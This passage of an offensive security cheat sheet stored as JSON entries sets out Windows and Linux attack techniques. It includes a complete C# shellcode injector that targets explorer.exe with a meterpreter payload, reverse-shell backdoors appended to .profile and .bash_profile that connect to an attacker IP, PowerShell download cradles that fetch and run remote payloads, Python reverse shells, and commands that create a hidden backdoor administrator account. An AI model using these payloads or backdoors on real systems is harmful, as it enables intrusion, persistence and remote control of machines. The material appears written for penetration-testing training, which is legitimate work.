    "title": "Process Hollowing Theory",
    "tags": [
      "Code_Injection",
      "Defense_Evasion",
      "Process_Hollowing",
      "Windows"
    ],
    "steps": [
      {
        "title": "Process Hollowing Flow",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hollowing sequence:\n1. Create target process in suspended state (**CREATE_SUSPENDED**)\n2. Unmap original executable from process memory (**NtUnmapViewOfSection**)\n3. Allocate new memory at process base address (**VirtualAllocEx**)\n4. Write malicious PE to allocated memory (**WriteProcessMemory**)\n5. Set thread context to point to new entry point (**SetThreadContext**)\n6. Resume thread execution (**ResumeThread**)",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Required APIs",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **CreateProcessA** - Create suspended process\n- **NtUnmapViewOfSection** - Unmap original image\n- **VirtualAllocEx** - Allocate memory for new image\n- **WriteProcessMemory** - Write PE headers and sections\n- **GetThreadContext** - Get current thread context\n- **SetThreadContext** - Update entry point\n- **ResumeThread** - Start execution"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "MITRE ATT&CK - Process Hollowing",
        "url": "https://attack.mitre.org/techniques/T1055/012/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Create legitimate process in suspended state, replace its memory with malicious code, resume execution. Process appears legitimate but runs malicious code.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Process Injection",
    "title": "Process Injection in C#",
    "tags": [
      "Code_Injection",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "API Imports",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\n\npublic class Injector\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    // Process access rights\n    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Complete C# Process Injector",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\n\npublic class Injector\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    static void Main(string[] args)\n    {\n        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<Port> -f csharp\n        byte[] buf = new byte[<Size>] { 0xfc, 0x48, 0x83, ... };\n\n        // Find target process\n        Process[] procs = Process.GetProcessesByName(\"explorer\");\n        int pid = procs[0].Id;\n\n        // Open process with full access\n        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);\n\n        // Allocate RWX memory in remote process\n        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n\n        // Write shellcode to allocated memory\n        IntPtr outSize;\n        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);\n\n        // Execute shellcode via remote thread\n        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Process by Name",
        "codes": [
          {
            "lang": "csharp",
            "code": "public static int GetProcessId(string processName)\n{\n    Process[] processes = Process.GetProcessesByName(processName);\n    if (processes.Length > 0)\n    {\n        return processes[0].Id;\n    }\n    return -1;\n}"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Spawn and Inject",
        "codes": [
          {
            "lang": "csharp",
            "code": "Process proc = new Process();\nproc.StartInfo.FileName = @\"C:\\Windows\\System32\\notepad.exe\";\nproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\nproc.Start();\n\n// Give process time to initialize\nSystem.Threading.Thread.Sleep(1000);\n\nint pid = proc.Id;\n// ... injection code ..."
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Spawn new process in suspended state, inject, then resume.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Process Injection",
    "title": "Process Injection Theory",
    "tags": [
      "Code_Injection",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "Why Process Injection?",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Benefits of process injection:\n- **Evasion** - Code runs in legitimate process\n- **Privilege** - Inherit target process permissions\n- **Persistence** - Survive original process termination\n- **Context** - Access target's tokens and resources",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Common Injection Targets",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Good target processes:\n- **explorer.exe** - Always running, user context\n- **svchost.exe** - Multiple instances, various privileges\n- **notepad.exe** - Benign appearance, spawnable\n- **RuntimeBroker.exe** - Common Windows 10 process",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Required APIs",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **OpenProcess** - Get handle to target process\n- **VirtualAllocEx** - Allocate memory in remote process\n- **WriteProcessMemory** - Write shellcode to allocated memory\n- **CreateRemoteThread** - Execute shellcode in remote process"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "MITRE ATT&CK - Process Injection",
        "url": "https://attack.mitre.org/techniques/T1055/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Inject code into another process's memory space. Evades process-based detection and inherits target's privileges/context.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Config File Backdoors",
    "title": "Profile Backdoors",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": ".profile Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'nohup bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.profile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": ".bash_profile Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'nohup nc -e /bin/bash <AttackerIP> <Port> &' >> ~/.bash_profile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Operating System and Programming Theory",
    "title": "Programming and Windows Internals",
    "tags": [],
    "steps": [
      {
        "title": "Programming Language Levels",
        "substeps": [
          {
            "title": "Low-Level Languages",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Machine code and assembly. Direct hardware interaction, no abstraction. Examples: x86 Assembly, ARM Assembly.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "Mid-Level Languages",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Balance between hardware access and abstraction. Examples: C, C++.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "High-Level Languages",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Significant abstraction from hardware. Examples: C#, Python, PowerShell.",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Managed vs Unmanaged Code",
        "substeps": [
          {
            "title": "Unmanaged Code",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Compiled directly to machine code. Executes directly on CPU. Examples: C, C++.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "Managed Code",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Runs within a runtime environment (CLR for .NET). Just-In-Time (JIT) compilation. Examples: C#, VB.NET, PowerShell.",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows on Windows (WoW64)",
        "substeps": [
          {
            "title": "Check Process Architecture",
            "codes": [
              {
                "lang": "powershell",
                "code": "[Environment]::Is64BitProcess"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Check OS Architecture",
            "codes": [
              {
                "lang": "powershell",
                "code": "[Environment]::Is64BitOperatingSystem"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "WoW64 File System Redirection",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Access real System32 from 32-bit process\n$env:windir + \"\\Sysnative\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "32-bit processes accessing `C:\\Windows\\System32` are redirected to `C:\\Windows\\SysWOW64`.",
                "variant": "warning"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**WoW64** allows 32-bit applications to run on 64-bit Windows. Important for payload compatibility.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Win32 API Fundamentals",
        "substeps": [
          {
            "title": "Common API Categories",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "- **Kernel32.dll** - Process/thread management, memory operations, file I/O\n- **Ntdll.dll** - Native API, lowest user-mode layer before kernel\n- **User32.dll** - GUI, windows, messages\n- **Advapi32.dll** - Security, registry, services"
              }
            ]
          },
          {
            "title": "Key APIs for Offensive Operations",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Critical APIs:\n- **VirtualAlloc** - Allocate memory with specific permissions\n- **VirtualProtect** - Change memory protection\n- **CreateThread** - Create new thread in current process\n- **CreateRemoteThread** - Create thread in another process\n- **WriteProcessMemory** - Write to another process's memory\n- **NtCreateThreadEx** - Native API thread creation (less monitored)",
                "variant": "important"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Win32 APIs provide access to Windows functionality. Essential for shellcode execution and process manipulation.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Windows Registry",
        "substeps": [
          {
            "title": "Registry Hives",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "- **HKEY_LOCAL_MACHINE (HKLM)** - System-wide settings\n- **HKEY_CURRENT_USER (HKCU)** - Current user settings\n- **HKEY_CLASSES_ROOT (HKCR)** - File associations, COM objects"
              }
            ]
          },
          {
            "title": "Query Registry",
            "codes": [
              {
                "lang": "bash",
                "code": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""
              },
              {
                "lang": "powershell",
                "code": "Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Add Registry Value",
            "codes": [
              {
                "lang": "bash",
                "code": "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v <Name> /t REG_SZ /d \"<Command>\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hierarchical database storing configuration. Common persistence and evasion target.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft Win32 API",
        "url": "https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Understanding programming concepts and Windows internals is essential for developing custom tools and evasion techniques.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Protocol Analysis",
    "title": "Protocol Reverse Engineering",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Reverse_Engineering",
      "Windows"
    ],
    "steps": [
      {
        "title": "Capture Network Traffic",
        "codes": [
          {
            "lang": "bash",
            "code": "# Capture traffic on specific port\ntcpdump -i eth0 port <Port> -w capture.pcap\n\n# In Wireshark: filter\ntcp.port == <Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use Wireshark or tcpdump for packet capture."
          }
        ]
      },
      {
        "title": "Identify Protocol Type",
        "codes": [
          {
            "lang": "text",
            "code": "Text protocols: Readable ASCII, line-based (HTTP, SMTP, FTP)\nBinary protocols: Non-printable bytes, fixed structures\nHybrid: Text commands with binary data"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine if protocol is text or binary based."
          }
        ]
      },
      {
        "title": "Analyze Packet Structure",
        "codes": [
          {
            "lang": "text",
            "code": "Common binary protocol structure:\n+--------+--------+--------+--------+\n| Magic  | Length | Type   | Data...|\n+--------+--------+--------+--------+\n  4 bytes  4 bytes  2 bytes  variable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break down packet into fields."
          }
        ]
      },
      {
        "title": "Identify Magic Bytes/Signatures",
        "codes": [
          {
            "lang": "text",
            "code": "; In Wireshark, look for repeated patterns at offset 0\n; In WinDbg after recv:\n0:000> db poi(esp+8) L20     ; First 32 bytes of received data"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Look for constant values at packet start."
          }
        ]
      },
      {
        "title": "Identify Length Fields",
        "codes": [
          {
            "lang": "text",
            "code": "1. Send packets of different sizes\n2. Look for bytes that change proportionally\n3. Test: does changing field affect parsing?"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find fields that control data size."
          }
        ]
      },
      {
        "title": "Reverse Engineering Checksums",
        "codes": [
          {
            "lang": "text",
            "code": "1. Send valid packet, note checksum\n2. Modify one byte, observe checksum change\n3. Test common algorithms: CRC32, MD5, simple sum\n4. Set breakpoint on packet validation code"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understand integrity validation."
          }
        ]
      },
      {
        "title": "Common Checksum Algorithms",
        "codes": [
          {
            "lang": "python",
            "code": "# Simple additive checksum\ndef checksum_add(data):\n    return sum(data) & 0xFFFFFFFF\n\n# XOR checksum\ndef checksum_xor(data):\n    result = 0\n    for b in data:\n        result ^= b\n    return result\n\n# CRC32\nimport binascii\ndef checksum_crc32(data):\n    return binascii.crc32(data) & 0xFFFFFFFF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Recognize checksum patterns."
          }
        ]
      },
      {
        "title": "Bypass Checksum Validation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Methods to handle checksum requirements:\n- **Calculate correct checksum**: Reverse algorithm, compute valid value\n- **Patch binary**: NOP out checksum validation code\n- **Breakpoint method**: Modify checksum in memory after calculation",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Identify Command/Opcode Fields",
        "codes": [
          {
            "lang": "text",
            "code": "1. Capture multiple different operations\n2. Identify bytes that differ between operations\n3. Map values to functionality"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find fields that determine action type."
          }
        ]
      },
      {
        "title": "Build Protocol Client",
        "codes": [
          {
            "lang": "python",
            "code": "import socket\nimport struct\n\ndef build_packet(opcode, data):\n    \"\"\"Build protocol packet\"\"\"\n    header = struct.pack(\"<I\", 0x12345678)  # Magic\n    length = struct.pack(\"<I\", len(data))   # Data length\n    cmd = struct.pack(\"<H\", opcode)         # Command\n    return header + length + cmd + data\n\ndef send_packet(host, port, packet):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(packet)\n    response = s.recv(4096)\n    s.close()\n    return response\n\n# Test\npacket = build_packet(0x01, b\"test data\")\nresponse = send_packet(\"<TargetIP>\", <Port>, packet)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create Python client for testing."
          }
        ]
      },
      {
        "title": "Analyze Response Handling",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp ws2_32!send \"dd esp L5; db poi(esp+8) L poi(esp+c); g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understand how server processes and responds."
          }
        ]
      },
      {
        "title": "Document Protocol Specification",
        "codes": [
          {
            "lang": "text",
            "code": "Packet Format:\n  Offset 0x00: Magic (4 bytes) - 0x12345678\n  Offset 0x04: Length (4 bytes) - little-endian, data only\n  Offset 0x08: Opcode (2 bytes) - command identifier\n  Offset 0x0A: Data (variable) - command-specific\n\nOpcodes:\n  0x0001: Login\n  0x0002: Execute\n  0x0003: Upload"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create reference for exploit development."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Protocol Analysis Techniques",
        "url": "https://en.wikipedia.org/wiki/Reverse_engineering"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Understand custom network protocols to craft exploit payloads."
      }
    ]
  },
  {
    "category": "Constrained Delegation",
    "title": "Protocol Transition Attack",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "When Protocol Transition Enabled",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe s4u /user:<ServiceAccount> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:<SPN> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If **TRUSTED_TO_AUTH_FOR_DELEGATION** flag set, can use S4U2Self without user authentication.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "When Protocol Transition Disabled",
        "codes": [
          {
            "lang": "bash",
            "code": "# Get TGT for service account\nRubeus.exe asktgt /user:<ServiceAccount> /rc4:<NTHash>\n\n# Use with S4U2Proxy only\nRubeus.exe s4u /ticket:<ServiceTGT> /impersonateuser:Administrator /msdsspn:<SPN> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Need existing TGT/ticket from target user to use S4U2Proxy.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "NetExec",
    "title": "Proxy Mode",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Use with ProxyChains",
        "codes": [
          {
            "lang": "bash",
            "code": "proxychains nxc smb <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use with SOCKS Proxy",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --proxy socks5://127.0.0.1:1080"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "In-Memory PowerShell Execution",
    "title": "Proxy-Aware Communication",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "PowerShell",
      "Windows"
    ],
    "steps": [
      {
        "title": "PowerShell Proxy Configuration",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Use system proxy\n[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()\n[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Proxy-Aware Download Cradle",
        "codes": [
          {
            "lang": "powershell",
            "code": "$proxy = [System.Net.WebRequest]::GetSystemWebProxy()\n$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials\n$wc = New-Object System.Net.WebClient\n$wc.Proxy = $proxy\nIEX($wc.DownloadString('http://<AttackerIP>/payload.ps1'))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Custom User-Agent",
        "codes": [
          {
            "lang": "powershell",
            "code": "$wc = New-Object System.Net.WebClient\n$wc.Headers.Add(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\")\n$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()\n$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials\nIEX($wc.DownloadString('http://<AttackerIP>/payload.ps1'))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SYSTEM Proxy Access",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Read proxy from registry (works for SYSTEM context)\n$proxyAddr = (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings').ProxyServer\nif ($proxyAddr) {\n    $proxy = New-Object System.Net.WebProxy($proxyAddr)\n    $wc = New-Object System.Net.WebClient\n    $wc.Proxy = $proxy\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "When running as SYSTEM, proxy settings are in different location.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Ensure payloads work through corporate proxies.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Python Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Linux IPv4",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<AttackerIP>\",<Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Python with PTY",
        "codes": [
          {
            "lang": "bash",
            "code": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<AttackerIP>\",<Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Python with Environment Variables",
        "codes": [
          {
            "lang": "bash",
            "code": "export RHOST=\"<AttackerIP>\";export RPORT=<Port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Python IPv6",
        "codes": [
          {
            "lang": "bash",
            "code": "python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"<IPv6Address>\",<Port>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "File Transfer Techniques",
    "title": "Quick Reference",
    "tags": [],
    "steps": [
      {
        "title": "Windows Download Methods",
        "codes": [
          {
            "lang": "bash",
            "code": "# certutil (most reliable)\ncertutil -urlcache -split -f \"http://<IP>/file.exe\" file.exe\n\n# PowerShell\npowershell -c \"iwr -uri http://<IP>/file.exe -Outfile file.exe\"\n\n# bitsadmin\nbitsadmin /transfer job /download /priority high http://<IP>/file.exe C:\\Temp\\file.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows Upload Methods",
        "codes": [
          {
            "lang": "bash",
            "code": "# SMB (best)\ncopy file.txt \\\\<KaliIP>\\share\\\n\n# Netcat\nnc <KaliIP> 4444 < file.txt\n\n# PowerShell\nInvoke-RestMethod -Uri http://<KaliIP>/upload -Method Post -InFile file.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux Download Methods",
        "codes": [
          {
            "lang": "bash",
            "code": "# wget (most common)\nwget http://<IP>/file.sh\n\n# curl\ncurl http://<IP>/file.sh -o file.sh\n\n# Download and execute\ncurl http://<IP>/script.sh | bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux Upload Methods",
        "codes": [
          {
            "lang": "bash",
            "code": "# Netcat\nnc <KaliIP> 4444 < file.txt\n\n# curl\ncurl -X POST -F \"file=@file.txt\" http://<KaliIP>/upload\n\n# SCP\nscp file.txt user@<KaliIP>:/tmp/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Quick Reference",
    "tags": [],
    "steps": [
      {
        "title": "Python PTY (Most Common)",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n^Z\nstty raw -echo; fg\nreset\nexport TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Script Method",
        "codes": [
          {
            "lang": "bash",
            "code": "script /dev/null -c bash\n^Z\nstty raw -echo; fg\nreset\nexport TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Socat Method (Best)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Kali\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n# Target\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KaliIP>:4444"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "One-Liner Spawns",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nperl -e 'exec \"/bin/bash\";'\nruby -e 'exec \"/bin/bash\"'\nlua -e \"os.execute('/bin/bash')\"\nawk 'BEGIN {system(\"/bin/bash\")}'\nfind / -name blah -exec /bin/bash \\;"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "User Management Commands",
    "title": "Quick Reference",
    "tags": [],
    "steps": [
      {
        "title": "Windows One-Liners",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create admin user\nnet user hacker P@ss123! /add && net localgroup Administrators hacker /add\n\n# Create RDP user\nnet user rdp P@ss123! /add && net localgroup \"Remote Desktop Users\" rdp /add\n\n# Create hidden admin\nnet user backdoor$ P@ss123! /add && net localgroup Administrators backdoor$ /add"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux One-Liners",
        "codes": [
          {
